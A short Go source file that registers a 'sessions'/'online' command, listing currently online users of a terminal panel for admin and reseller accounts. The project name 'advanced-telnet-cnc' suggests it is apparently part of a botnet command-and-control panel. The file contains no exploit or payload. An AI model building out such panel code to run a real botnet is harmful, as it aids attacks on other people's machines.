package admin

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"sessions", "online"},
		Description: "Shows a list of all currently online users.",
		Admin:       false,
		Reseller:    true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			s := command.Retrieve("users")
			cmd := command.RetrieveSubCommand("users", "sessions")
			if cmd == nil {
				return nil
			}
			return cmd.Executor([]string{"sessions"}, fx, session, s)
		},
	})
}
